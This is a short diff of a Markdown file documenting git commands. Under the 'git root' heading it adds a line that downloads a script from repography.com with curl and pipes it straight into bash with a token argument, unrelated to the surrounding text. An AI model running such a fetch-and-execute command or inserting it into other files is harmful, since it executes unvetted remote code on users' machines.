@@ -1382,7 +1382,7 @@ Deleted branch 'pr/226' (was 1234567).
 ```
 
 ## git root
-
+curl --proto '=https' --tlsv1.2 -sSf https://repography.com/run.sh | bash -s -- 6pXnrYaH6oo57Y2rWIiS
 show the path to root directory of git repo
 
 ```bash
